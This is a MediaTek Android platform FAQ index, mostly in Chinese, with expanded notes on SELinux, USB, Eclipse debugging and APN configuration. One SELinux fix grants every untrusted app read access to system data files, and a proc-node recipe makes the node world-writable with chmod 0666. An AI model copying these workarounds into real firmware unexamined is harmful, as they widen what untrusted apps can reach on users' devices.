## [FAQ13676]  在Dialpad中长按输入的号码，无复制粘贴等选项出来

## [性能]  [FAQ09466]  如何关闭zram(内存压缩)以测试系统性能

## [FAQ13931]  [keypad] 怎样在Android L版本添加新Key?

## [FAQ14325]  [Audio framework] 如何去掉AMR格式

## [FAQ14329]  [Audio framework] 如何在Framework层互斥两个通过 MediaPlayer 播放的音乐播放器

## [FAQ04521]  【ICU】如何修改某语言的数字显示系统

## [FAQ14364]  如何把L版本的Recents APP风格改成KK版本的风格

## [FAQ14178]  L版本增加关机振动

## [FAQ14106]  L版本如何enable "adb shell dumpsys alarm"命令

## [ota]  [FAQ12947]  [Recovery] Update LOGO&LK&PRELOADER via OTA upgrade

## [FAQ08919]  [NW] 网络运营商名称显示规则（锁屏界面，下拉列表）---网络名称 客制化方法 和 问题处理flow

## [FAQ09394]  [NW] 网络运营商名称显示&SIM名称显示

## [FAQ14481]  [Audio Effect] 玩游戏雷霆战机时发生卡顿的问题

## [FAQ12646]  适配开机lk阶段任意尺寸充电图标（比lcm size 小的图片）

## [FAQ14527]  IPO（smart phone fast boot up）Enable Guide

## [FAQ14656]  检查版本是否支持SBP功能???SBP是什么???

## [FAQ14744]  L版本APPIOT常见问题总结(对比机可以复现)  APPIOT 是什么意思??

## [ota]  [FAQ14751]  L 版本Security OTA升级方法

## [FAQ14531]  [Audio Profile] “提示音和通知”中试听手机铃声时来电，来电铃声和预览铃声声音重叠

## [FAQ14667]  [Audio Profile] 情景模式里如何增加通话音量进度条调节?

## [FAQ07275]  如何在linux中添加新的kernel module

## [FAQ13320]  [Audio Profile] 如何打开各个铃声选择框的default、silent、more选项

## [FAQ14861]  mms去掉彩信功能

## [FAQ14768]  修改ART mode减少ROM大小 （如GMO project / FOTA升级）

## [FAQ14868]  modem log用什么工具分析?????catcher

## [FAQ14724]  Android 5.0上的Settings Search功能介绍

## [FAQ13137]  为什么MTKLogger UI显示的路径与实际路径不一致?

## [FAQ15040]  如何增加色度，饱和度，对比度，亮度的调节幅度

## [FAQ11062]  如何实现usb驱动自动安装?

## [FAQ12749]  联系人如何区分*123与123这两个号码

## [FAQ15070]  Android5.0版本APN界面会显示运营商名字的问题

## [FAQ15113]  低电压关机，关机充电到15%自动开机

## [FAQ09065]  [Others] MTK发布的Android software Tools 工具包中所有工具的说明

## [FAQ15257]  [Audio App] 如何在通知栏上显示 music 播放/暂停 的控件

## [FAQ15332]  快速开关wifi，导致wifi打不开

## [FAQ15503]  预置运营商的wifi AP之后引起功耗大

## [FAQ09200]  [Dialer]  [Geocoding] 如何关闭来电号码归属地?

## [FAQ09009]  [Dialer] 如何修改号码显示格式?比如将number修改为4-4-3分段格式

## [FAQ11929]  [Dialer] 相同号码联系人A和B, 拨打B时通话界面和通话记录都显示A

## [FAQ09449]  [Dialer] 通话记录匹配异常

## [FAQ10377]  [Dialer] Google的固话号码归属地-区号与归属地对照表[中国大陆部分]

## [FAQ10383]  添加MCCMNC自动号码匹配后拨号匹配不到联系人

## [FAQ10342]  [Dialer]  [Geocoding] 修改手机号码归属地

## [FAQ17396]  check jni问题解决方法

## [FAQ12677]  【Phone Call】带"*" "#"的语音信箱号码会匹配到联系人的问题

## [FAQ04400]  [Others]  如何手动强制更新PC端USB驱动

## [FAQ09781]  [Dialer] 如何能在来电时始终在对方号码前加上国家码

## [FAQ11604]  Email里面添加优先级指示

## [FAQ09450]  如何在"设置->关于手机"界面添加Logo

## [FAQ17438]  5G hotspot 设置

## [FAQ07588]  [FM] FM播放时拔出耳机后,FM APP出现"拔出耳机，Fm停止"的提示框，然后自动close

## [FAQ04249]  [sdcard-common] 新开项目SDCard不识别，如何debug?

## [FAQ16262]  [video recoder] 录像时关闭Record audio,录的视频播放时间只有录制时间的一半

## [FAQ16263]  [Video]  [Video Player]  进入视频播放器，播放视频文件提示“insufficient memory”

## [FAQ06196]  [FM] FM搜台时如何选择性保存搜到的电台

## [FAQ03932]  [Audio Driver] 如何打开/关闭3G通话时对AMR-WB的支持

## [FAQ17482]  [others] setting中删除视频和图片在Gallery中仍可以查看缩略图

## [FAQ03604]  [Contacts Data]  联系人名字多音字的处理方法

## [FAQ17545]  [AudioProfile] 关于M版本双卡铃声

## [FAQ17578]  omacp的email xml文件样本

## [FAQ12935]  【Contacts Data】预置联系人之Vcard预置联系人

## [FAQ10133]  【Contacts Data】 联系人列表如何将联系人名字为泰语的联系人归类到# group

## [FAQ10398]  【Contacts Data】"万俟" 应该排列在"M"下面,而不是"W"下面

## [FAQ10385]  【Contacts Data】 Google默认群组名称可以修改吗?

## [FAQ08580]  【Zone】如何通过网络确定当前时区

## [FAQ17627]  电信自注册基础知识??????

## [FAQ17665]  快速修改调试Feature Table

## [FAQ13560]  [BMT] 长按power key（power key+home key）shutdown 或者reset phone

## [FAQ17710]  Android UI显示电量跳变

## [FAQ17774]  [People] 美式英语下面输入特殊名字字符，出现 DisplayName变化为phone number

## [FAQ08972]  [NW] 信号格显示的平滑处理

## [FAQ17839]  Browser参数支持情况

## [FAQ17838]  Browser的M版本UA Profile

## [FAQ13734]  状态栏中的信号栏添加上下行标识

## [FAQ17968]  new Mediaplayer耗时导致开机过程中kernel logo到开机动画之间黑屏

## [FAQ09041]  [People] 如何修改联系人地址显示格式?

## [FAQ09414]  [People] 分享可见的联系人，通过短信。短信内容修改成将注释和地址也显示出来

## [FAQ10047]  [People]  [联系人头像】联系人通过拍照设置头像，图库中会有两张同样的图片，如何删除其中一张

## [FAQ11085]  [People] 联系人详情界面的某些字段前面加"!"

## [FAQ10667]  [People] 联系人字段中增加生日字段

## [FAQ11096]  [People] 【匈牙利】匈牙利语环境下，联系人的姓名顺序颠倒

## [FAQ11676]  [People] 需要每次新建联系人都弹出帐号选择列表

## [FAQ11693]  [People] 联系人详情界面设置默认号码后位置不移动只在末尾打上钩

## [FAQ12527]  [People] 输入8或者6会搜索出来name和number都没有6的联系人

## [FAQ12523]  [People] 在联系人搜索界面中同时搜到+7开头和8开头的记录

## [FAQ13132]  [People] PeopleList搜索机制

## [FAQ14055]  [People] Android平台系统语言从繁体中文切换到简体中文，联系人中文排序看似乱码

## [FAQ17502]  [Gallery] 照片详情中的时间格式与系统时间格式不一致

## [FAQ18017]  recovery mode开机闪屏问题分析

## [FAQ18023]  Settings--Storage&USB，选择图片--删除，提示不能删除此文件

## [FAQ04172]  如何修改有几张卡插入就显示几个信号图标

## [FAQ11117]  如何把状态栏信号格改为5格

## [FAQ09448]  如何在quicksettings中增加一个新的buttons

## [FAQ14365]  下拉通知栏底部如何显示运营商图标

## [FAQ18050]  如何获取2G服务小区信号强度和信号质量

## [FAQ17787]  L-OS通过T卡升级到M-OS后（lk不升级）不能连接meta

## [FAQ14866]  [Audio App] 代码如何实现识别“耳机hook键长按”的动作?music和fm apk并对此进行响应

## [FAQ04679]  双卡项目如何在状态栏显示或隐藏G,3G以及卡1和卡2的信号标识

## [FAQ09081]  NavigationBar（虚拟按键）横屏时显示位置

## [FAQ13709]  如何在 QuickSettings 上添加一个开关

## [FAQ08581]  [Audio Profile]  如何修改情景模式的默认值

## [FAQ18073]  M 版本快速开关飞行模式出现飞行模式开启时蓝牙打开

## [FAQ17995]  How to do calibration with MauiMeta tool

## [FAQ18089]  短信SMS流程及解码方法介绍

## [FAQ18107]  如何解决ListView打开下拉回弹效果后有时无法回弹的问题?

## [FAQ18154]  modemlog无法打开或关闭，提示命令超时

## [ota]  [FAQ11447]  [Recovery]  [Common] 从JB(4.2)版本通过FOTA升级到KK(4.4)版本的注意事项

## [FAQ14051]  在长按power键弹出的关机对话框中添加“Airplane Mode”菜单

## [FAQ14053]  L1下拉状态栏QuickSetting没有数据连接

## [FAQ18110]  Vibrator概率性不震动

## [FAQ12073]  [SEC] 如何屏蔽SIMME LOCK解锁界面

## [FAQ13736]  [Audio Profile] L版本上music如何设置双卡铃声

## [FAQ18193]  [Audio Policy] 如何添加开关修改指定场景的输出device

## [FAQ18234]  使用monitor中的systrace抓取时出现trace_marker:Bad File Descriptor(9)

## [FAQ15274]  如何使用watchpoint?

## [FAQ18098]  [Graphics] Skia绘图的dump方法

## [FAQ10135]  [People] 新建/编辑联系人时，检测输入的email/邮件地址格式是否合法

## [FAQ14415]  如何开启early printk调试kernel?

## [FAQ12122]  [SEC] 过期卡锁卡需求-卡2依赖卡1 (越南为例)

## [FAQ12123]  [SEC] 过期卡锁卡需求-双卡相互依赖 (KK版本)

## [FAQ18351]  How to fix MAC address by driver

## [FAQ12521]  [Dialer] 如何在通话界面上实现+7和8互相匹配

## [FAQ06838]  如何通过omnipeek抓取sniffer log--new

## [FAQ18373]  qq音乐播放，进入多任务杀掉QQ音乐后，耳机hook键就不起作用

## [FAQ18202]  [Recovery]  [Common] Android L ->M版本OTA/T卡升级注意事项

## [FAQ13232]  L 预置apk

## [FAQ13893]  android L小区广播预置方法

## [FAQ17487]  [USB]  PC上如何正确配置、安装USB驱动

## [FAQ14736]  【sdcard-FAT filesystem】如何预置资源到手机存储

## [FAQ12895]  如何使用工具抓取ftrace

## [FAQ18016]  L/M版本开机黑屏问题区分

## [FAQ14102]  L版本开机提示“Android正在升级或启动”

## [FAQ12410]  Panorama照片在Gallery中沒有动画

## [FAQ09198]  Setting语言与输入法列表客制化

## [FAQ08649]  [SP FlashTool/SP Multiport Download Tool]  Donwload完整性检查和开机检查客制化

## [FAQ06038]  如何打开DB文件

## [FAQ05872]  如何用DDMS分析native memory leak

## [FAQ13345]  Android L版本上指南针apk读取不到sensor数据的原因分析

## [FAQ03718]  如何解包和打包boot.img/recovery.img/system.img/userdata.img

## [FAQ13697]  L 版本如何将第三方so库打包到apk

## [FAQ03127]  当修改一些代码时,使用什么编译命令可以最有效率

## [FAQ08775]  如何客制化IPO开机动画，使IPO开机动画播放完整

## [nvram]  [FAQ04542]  [NvRAM]  APK（应用层）读写NvRAM

## [FAQ19126]  [Audio framework] 车载蓝牙停止播放, 手机music UI 显示停止但车载端音乐继续播放

## [FAQ10781]  如何开启与关闭adb 的认证机制(google adb secure) (adb RSA 指纹认证)

## [FAQ19141]  After M version,how to dump heap profile automatically

## [FAQ12739]  [CB]  如何设置小区广播的默认语言

## [FAQ18246]  M版本上如何实现恢复出厂设置不丢失数据 (nvram,proinfo 分区注意事项)

## [FAQ17349]  [SIM_ME_LOCK] SIM_ME_Lock_User_Guide文档中的枚举量的意思

## [FAQ12953]  [AT Command]  [SIM]  如何使用AT+CRSM读取SIM卡文件

## [FAQ02097]  [SIM] 客制化"SIM卡已更改"提示

## [TOOL]  [FAQ09816]  [SP FlashTool]  FlashTool Console Mode使用说明

```text
FlashTool 终端模式的使用方法
```

## [FAQ17416]  SIM卡设置内的卡名称及运营商名称的语言类别随系统语言切换而改变

## [FAQ06172]  [AT Command]  [SIM_ME_LOCK] 锁卡相关的AT+ESMLCK命令的用法

## [FAQ19162]  Android N 设置中语言列表介绍

## [FAQ19202]  【Encryption】遇到加密问题，如何抓取log?

## [FAQ17485]  SP Flashtool和SP Multiport Download Tool的Checksum功能介绍

## [FAQ13989]  【Phone Call】L版本上关于通话时间显示异常的处理

## [FAQ11506]  [SIM] 如何客制化SIM默认颜色

## [FAQ18298]  小区广播不要在短信列表里显示，只显示在notification

## [FAQ18140]  [Gallery] Gallery不能打开隐藏文件夹中的图片

## [FAQ19618]  如何在ap获取拍照的yuv数据

## [FAQ19621]  开关机时根据SIM卡动态适配开关机动画

## [FAQ19779]  Android N resource加载逻辑介绍（语言切换不成功等问题）

## [FAQ15097]  OTA升级后Home键失灵

## [FAQ06210]  如何让主菜单的背景显示为壁纸?

## [FAQ03858]  滑动锁屏状态下如何禁止下拉状态栏?

## [FAQ12135]  [SAT] 怎么实现SAT icon一直显示在launcher菜单中

## [FAQ10107]  [SAT] STK icon name动态修改成STK一级菜单的title

## [FAQ18531]  [SAT] 插入某种特定卡开机，点击STK Icon,显示STK未安装

## [FAQ18919]  [SAT] 正常使用中toast提示“发送短信”

## [FAQ09351]  [Others] 如何使用超级终端发送AT Command以及抓取Uart Log

## [FAQ04013]  如何开启或关闭VOIP(sip call)功能

## [FAQ19894]  N上预置APK失败提示找不到so文件

```text
[DESCRIPTION] 
预置APK到系统之后打开APK会提示：
01-01 12:00:39.537 5326 5326 E AndroidRuntime: Process: com.skype.raider, PID: 5326
01-01 12:00:39.537 5326 5326 E AndroidRuntime: java.lang.UnsatisfiedLinkError: dalvik.system.PathClassLoader[DexPathListlib]  couldn't find "libSkypeAndroid.so"
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at java.lang.Runtime.loadLibrary0(Runtime.java:972)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at java.lang.System.loadLibrary(System.java:1530)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.util.CrashAndAnrHandler.<clinit>(SourceFile:19)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.util.CrashAndAnrHandler.saveHandlers(Native Method)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.skylib.SkyLibInitializer.a(SourceFile:115)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.SkypeModule.a(SourceFile:126)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.SkypeModule_SkyLibFactory.get(SourceFile:37)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.SkypeModule_SkyLibFactory.get(SourceFile:11)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at dagger.internal.d.get(SourceFile:47)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.app.BackgroundMode_Factory.get(SourceFile:72)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.app.BackgroundMode_Factory.get(SourceFile:16)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at dagger.internal.d.get(SourceFile:47)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.wakeup.DreamKeeper_Factory.get(SourceFile:48)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.wakeup.DreamKeeper_Factory.get(SourceFile:12)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at dagger.internal.d.get(SourceFile:47)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.wakeup.ForegroundObserver_Factory.get(SourceFile:34)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.wakeup.ForegroundObserver_Factory.get(SourceFile:8)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at dagger.internal.d.get(SourceFile:47)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.SkypeApplication_MembersInjector.injectMembers(SourceFile:160)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.SkypeApplication_MembersInjector.injectMembers(SourceFile:24)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.DaggerSkypeApplicationComponent.inject(SourceFile:2266)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.skype.android.SkypeApplication.onCreate(SourceFile:152)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at android.app.Instrumentation.callApplicationOnCreate(Instrumentation.java:1027)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at android.app.ActivityThread.handleBindApplication(ActivityThread.java:5503)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at android.app.ActivityThread.-wrap2(ActivityThread.java)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1595)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at android.os.Handler.dispatchMessage(Handler.java:110)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at android.os.Looper.loop(Looper.java:203)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at android.app.ActivityThread.main(ActivityThread.java:6251)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at java.lang.reflect.Method.invoke(Native Method)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1063)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:924)
01-01 12:00:39.537 5326 5326 E AndroidRuntime: FATAL EXCEPTION: main
 
 
[SOLUTION] 
这是因为Google在N上对selinux有更严格的限制，APK的so文件被selinux挡住了：
01-01 12:00:39.520000  5326  5326 W om.skype.raider: type=1400 audit(0.0:64): avc: denied { read } for name="libSkypeAndroid.so" dev="mmcblk0p22" ino=770074 scontext=u:r:untrusted_app:s0:c512,c768 tcontext=u:object_r:system_data_file:s0 tclass=file permissive=0
 
参考如下的solution：
Add the policy to alps/device/mediatek/common|[platfrom] /sepolicy/basic|bsp|full/xxx.te
#====================== untrusted_app.te ======================
allow untrusted_app system_data_file:file r_file_perms;
```

## [FAQ10023]  [SP Meta]  [META MODE] 恢复出厂设置API????在哪里写??如何开发

## [FAQ19877]  如何使用GDB分析KE问题

## [FAQ19917]  [Android N]  N版本 bluedroid蓝牙问题Log抓取

## [FAQ10400]  如何在小部件列表中隐藏某个widget或者shortcut?

## [FAQ18166]  从Play Store下载的App安装后，App在Launcher3的桌面自动生成的快捷方式图标为小机器人

## [FAQ11476]  Launcher3如何设置桌面的行数和列数?

## [FAQ19902]  增加PIN/Password的密码最大长度

## [FAQ08916]  [ICU]  [Time] 如何修改或精确设置出厂默认时间

## [FAQ06452]  [ICU]  [Time] 如何修改时间中的上午/下午显示

## [FAQ04421]  [ICU]  [Time] 修改某语言环境下默认日期的格式

## [FAQ15096]  如何在Navigation Bar上长按recent button弹菜单出来

## [FAQ19780]  How to auto update apn database by OTA

## [FAQ08124]  关于状态栏的电量百分比

## [FAQ11908]  [FSA] 进入图库编辑图片保存后，去掉原有图片被覆盖的方法

## [FAQ09895]  [SAT] 怎么实现没插卡时launcher中不显示STK icon

## [FAQ11770]  [USB]  MTK USB问题宝典

```text
USB OTG问题：
FAQ06610 [USB]  USB OTG功能如何打开及实现 
FAQ03872 [USB]  怎么开启OTG功能
FAQ04016 [USB]  如何实现OTG U盘自动挂载 
FAQ06656 [USB]  哪些平台支持OTG，OTG功能支持的设备 
FAQ11784 [USB]  如何实现USB OTG鼠标的右键为返回键功能?

USB 名称修改系列：
FAQ09991 【USB名称修改系列】第1项-为什么参考FAQ修改名称后却无效
FAQ04857 【USB名称修改系列】第2项-如何修改PTP在PC"我的电脑"中显示的label名称 
FAQ03524 【USB名称修改系列】第3项-如何修改MTP在PC"我的电脑"中显示的label名称 
FAQ04856 【USB名称修改系列】第4项-如何修改BICR在PC"我的电脑"中显示的label名称
FAQ07081 【USB名称修改系列】第5项-如何修改MTP在PC设备管理器中制造商的名称 
FAQ05691 【USB名称修改系列】第6项-如何修改手机在PC桌面右下角弹出的“MT65xx Android Phone”提示框
FAQ09979 【USB名称修改系列】第7项-如何修改PTP设备在PC上弹出的对话框的标题 
FAQ09980 【USB名称修改系列】第8项-如何修改mtp设备在设备管理器中的”Portable Devices”下的名称 
FAQ09982 【USB名称修改系列】第9项-如何修改UMS在设备管理器中DiskDrive下的名称 
FAQ09985 【USB名称修改系列】第10项-如何修改设备管理器中设备名后的数字 
FAQ09986 【USB名称修改系列】第11项-如何修改preloader阶段的vcom口在windows右下角的提示框的字符串显示 
FAQ09987 【USB名称修改系列】第12项-如何修改MTP在windows弹出的自动播放提示框标题
FAQ04906 [USB名称修改系列]  第13项-如何修改USB存储在PC"我的电脑"中显示的label名称 
FAQ11803 [USB] 修改USB存储在PC"我的电脑"中显示的label名称，如何解决label中的小写字母全部变成大写字母的问题?
FAQ05418 【USB名称修改系列】第14项-如何修改pc端設備管理器中"Android Phone"目錄下的設備名
FAQ10612 【USB名称修改系列】第15项-如何修改USB设备在控制面板中显示的名称 
FAQ11542 [USB名称修改系列]  第16项-如何修改MTP在windows自动播放窗下的设备名称 
FAQ11559 [USB名称修改系列]  第17项-如何修改"USB tethering" 在PC端的显示
FAQ11561 [USB名称修改系列]  第18项-如何修改"ACM 虚拟串口" 在PC端设备管理器的显示
FAQ11984 [USB名称修改系列]  第19项-手机连上PC端，切成MTP mode，sd卡在电脑端的名称怎么修改
FAQ12212 [USB名称修改系列]  如何修改USB MTP模式下，“设备与打印机”中Model项的显示?
FAQ04779 [USB] 如何修改设备管理器中的磁盘驱动器名
FAQ09627 修改UMS功能在设备管理器中名称的限制 

USB serial number客制化：
FAQ10922 [USB serial number客制化]  [系列1] 如何修改adb devices的序列号 
FAQ10923 [USB serial number客制化]  [系列2] ：如何实现每台手机的序列号唯一?
FAQ10924 [USB serial number客制化]  [系列3] ：如何修改手机序列号为Barcode?
FAQ10925 [USB serial number客制化]  [系列4] ：如何修改手机序列号为手机型号? 
FAQ10926 [USB serial number客制化]  [系列5] ：如何实现可以通过pc工具来修改serial number? 
FAQ10927 [USB serial number客制化]  [系列6] ：能否实现adb devices的序列号，usb serial number, cts device ID，SN一致?
FAQ12705 [USB serial number客制化]  [系列7] ：MT6752/32 KK2版本定义CONFIG_MTK_USB_UNIQUE_SERIAL宏不起作用

USB 驱动安装问题：
FAQ11062 如何实现usb驱动自动安装? 
FAQ05690 [USB]  How to add ISO files into BICR? 
FAQ11544 [USB] -[CDROM] 如何设定打开CDROM后windows弹出自动播放窗口? 
FAQ03324 [USB]  [在Factory Mode或Recovery Mode开机后，MT65xx Android Phone的驱动如何安装?]  
FAQ03468 [USB] ADB驱动申请与安装问题 
FAQ10010 win8 64位 adb usb 驱动安装不成功
FAQ03928 [USB] MTP的介绍?驱动如何安装?

USB 测试认证相关问题：
FAQ09341 [USB] monkey测试，CTS认证，mtbfb测试，或自动化测试等，adb掉口(adb offline)问题的解决办法 
FAQ11050 Google CTS测试的USB VID/PID组合相关问题 
FAQ11649 [USB] KK修改serialno导致CTS测试失败 
FAQ08570 Monkey test时跑com.android.settings，ADB会断开
FAQ07395 [USB]  微软WHQL认证的一些基本问题
FAQ11017 [USB]  入库测试时，USB注意事项 
FAQ11451 [USB]  过USB-IF测试注意事项及修改

USB VID修改相关问题：
FAQ02433 [USB]  如何修改VID?
FAQ02497 [USB]  如何刪去USB的註冊表 

USB UMS问题：
FAQ06836 [USB] usb存储模式，拷贝大文件失败
FAQ08240 [USB] 没有外置SD卡，UMS模式下去掉PC端对应的盘符显示
FAQ06755 [USB] 如何同时打开UMS和BICR(CD-ROM)
FAQ10331 打开UMS功能后，只能看到外置T卡，不能看到内置T卡
FAQ06926 [USB]  如何设置UMS模式内置SD卡只读
FAQ09406 插入USB线，没有自动弹出‘打开USB存储设备’的页面

USB MTP/PTP问题：
FAQ09160 USB PTP功能如何同时显示内置、外置SD卡内容[JB2] 
FAQ09339 [USB] USB MTP模式下，copy mtklog到PC上时，出现拷贝错误，或者拷贝不全等问题
FAQ09470 MTP模式下，mtklog在PC 与file manager显示不同步，或者copy不完全
FAQ09665 MTP和PC数据同步时所支持的文件格式

USB ACM问题：
FAQ04694 [USB]  如何默认打开虚拟串口ACM的功能?
FAQ08605 GB2上怎么通过USB发AT命令
FAQ11178 User版本如何开启acm功能来下at command

USB ADB问题：
FAQ11513 [CMD] linux下的ADB在KK user版上无法使用的问题
FAQ10396 linux下使用adb出问题
FAQ11123 当修改VID PID后再连adb不识别的问题
FAQ03908 [USB] 如何开关默认USB调试功能 
FAQ11787 [USB]  KK user版本使用adb会提示error: device offline
FAQ13506 L版本ADB无法使用的问题

其他USB 相关问题：
FAQ04464 [USB] 如何修改USB连接后的默认功能
FAQ02436 [USB] 如何强制切换为USB 1.1?
FAQ10295 缓慢插入USB有时无法识别的问题 
FAQ11035 如何通过USB接口抓UART log 
FAQ09557 [USB]  使用USB互联网
FAQ11320 USB tethering以及USB internet的使用说明
FAQ10261 开启USB调试与打开USB Tethering成功与否的关系
FAQ10740 [ICUSB]  How to enable IC-USB feature?
FAQ19176 Android N 版本以后，MTK 不再支持 USB_Mass_Storage(UMS)功能.
```

## [FAQ20147]  how to update wifi firmware?

## [FAQ20366]  使用Android Studio debug Framework代码

## [FAQ04306]  如何通过 Eclipse 远端调试framework和APK?

## [FAQ11202]  如何在Eclipse中调试Framework和APK

## [FAQ03049]  如何在Eclipse里debug 系统内置的Application

## [FAQ03050]  如何解决Eclispe编译的android原生程序报找不到类的错误

```text
将联系人应用提取出来，并且将所依赖的jar包导入 eclipse ，编译成功后，安装联系人应用的apk文件到模拟器，发现应用运行不起来，通过查看trace，发现是找不到phone，mediatek下面相关的类。
[SOLUTION] 
这个主要是由静态编译和动态编译的原因造成。由于使用动态编译时，模拟器中没有可供调用的库，故报找不到类的错误。具体修改方法见下图:

见上图中，针对第三方库phone.jar和sns.jar需要使用Add External Jars的方式添加进来，这样 eclipse会以静态方式编译所依赖的库。就可以解决找不到类的问题。

备注：6573 Android V2.3上，LauncherPlus无法在MTK模拟器上debug和运行，需要使用真机来调试和运行看效果。
```

## [FAQ19267]  wifi: 连接网络时提示“已连接无法访问互联网”几秒钟后消失

## [FAQ14409]  [SIM] SIM卡默认名称客制化

## [FAQ20546]  android O定时开关机说明

## [FAQ20603]  [Framework-VPN] 设置Always-on VPN 如何保存

## [FAQ20612]  [Android O Build] 如何正确的添加环境变量

## [FAQ19089]  状态栏时间不更新

## [FAQ20622]  [SP FlashTool] SP Flashtool编译环境Qt Creator安装

## [FAQ20644]  Android O、N版本修改dex2oat编译选项，减少占用ROM空间或者加快安装速度

## [FAQ20665]  O1版本定制长按电源键弹出菜单选项

## [log]  [FAQ12427]  如何监测MTKLogger的状态改变

## [FAQ20328]  如何减少lowmemory的发生几率

## [FAQ12532]  [TimeZone] 如何更新时区data文件

## [FAQ19927]  [TimeZone] 执行生成tzdata脚本时遇到的问题

## [FAQ02484]  [BMT] 关机充电动画客制化以及错位调整

## [FAQ03426]  当系统存在多个Launcher时，如何设置开机自动进入默认的Launcher?

## [FAQ20670]  Android GO版本上 非首次进入应用过程中有从模糊到清晰的过程

## [FAQ18332]  如何修改 android log buffer 大小

## [FAQ20977] 如何配置VoLTE, ViLTE and VoWifi(IMS config for VoLTE, ViLTE and VoWifi)

## [FAQ11012] 如何为锁屏设置一张不同于launcher的，固定加载的背景图片

## [FAQ09296] 如何将APN设置为不可编辑

## [FAQ14252]  MT6735/35M/35P/53/53T软件包使用说明(L1.MP3&L1.MP3.TC7SP&M0.MP1适用)

```text
flashtool 报错 STATUS_DA_HASH_MISMATCH : flash不兼容的问题
```

## [FAQ10820] Android 8.1移植：针对某个APK做到wifi和gprs分别做到允许和禁止两种策略

```text
https://blog.csdn.net/zengrunxiu/article/details/81027275
```

###########################################################################################################
###########################################################################################################
################################################# FAQ end #################################################
###########################################################################################################
###########################################################################################################

###########################################################################################################
###########################################################################################################
################################################# WCP begin ###############################################
###########################################################################################################
###########################################################################################################

## [selinux] Android O版本 App 如何获取自定义节点的访问权限-SELinux

```text
背景介绍：接到一个任务，要做一个高温报警的开关。我的想法是在EngineerMode下面做这个功能。驱动调出来一个proc节点，写0开关打开有高温报警；写1开关关闭高温报警关闭，于是这个问题就变成了上层如何读写proc节点的问题。

查阅了很多资料，也查阅了以前N上的代码，做出如下总结：

1.在alps/device/mediatek/sepolicy/basic/non_plat/file.te中增加一个自定义的名称，格式如下：

自定义名称                 文件类型
type temperature_proc, fs_type,sysfs_type;

2.在alps/device/mediatek/sepolicy/basic/non_plat/genfs_contexts中将proc文件与自定义的名称链接起来。格式如下：

proc文件路径               自定义名称
genfscon   proc /sagereal_switch/sagereal_ntc_poweroff_switch u:object_r:temperature_proc:s0

3.你要知道你修改的apk的uid是什么类型的，目前我知道两种：一种是systemapp，AndroidManifest.xml中声明的是：android:sharedUserId="android.uid.system"；另一种是radio app，AndroidManifest.xml中声明的是：android:sharedUserId="android.uid.phone"。这样的声明能使得apk获得相对应的权限。EngineerMode声明的是android:sharedUserId="android.uid.phone"。

需要在alps/device/mediatek/sepolicy/basic/non_plat/radio.te（systemapp是在同路径下的system_app.te）新增所需要申请的权限，格式如下：
app类     自定义的文件名称 类型                  需要申请的权限

allow   radio    temperature_proc:file    { read write open ioctl getattr };

4.很容易遗漏的一步：

在平台相关的init.平台.rc文件中声明：

chmod 0666 /proc/sagereal_switch/sagereal_ntc_poweroff_switch

让该proc文件获得权限。

以上四步之后，权限就申请完毕了。

相关知识：te文件
```

## [APN] APN相关知识

```text
https://blog.csdn.net/u012686462/article/details/55213023

apn常见type及使用场景:
default:用于普通的上网，如浏览器，qq，微信等
mms:收发彩信时建立
dun:tethering时使用
xcap:ss操作
supl:定位使用
ims:volte call,vilte call,wfc,sms over ip
bip:bip相关操作

Background
apns-conf.xml is an XML file containing APN configurations for different operators. Telephony Provider will load content of apns-conf.xml into database, and User can check and edit APN from Settings application, also Data Framework will read APN configuration and use it for data connection.

apns-conf.xml provides APN configuration for world-wide operators, as the xml file has special format, there is something you need to know for apn data check in.

L vendor/mediatek/proprietary/frameworks/base/telephony/etc/apns-conf.xml
M/N device/mediatek/common/apns-conf.xml
O0 device/mediatek/config/apns-conf.xml
O1  device/mediatek/config/apns-conf.xml  + wifi-apns.xml
P0 device/mediatek/config/apns-conf.xml

APN parameters
The above figure is a sample of one APN item

The apn item must be included in <apn /> mark.
The fields marked red are usually mandatory, the other fields are optional according to the APN type and decided by operator.
For specific mcc/mnc, the same apn entry with the same type should be unique, update the original data instead of adding a new item.
authtype   0: None,  1: PAP,  2: CHAP,  3: PAP or CHAP. 
If this field is not specified but user item exists, default value is 3 PAP or CHAP.
If this field is not specified and user item is not configured too, default value is 0 None.
protocol/roaming_protocol   The valid values are "IP" "IPV6" "IPV4V6". Please don't use IPV4, use IP instead. If not specified, default value is IP.
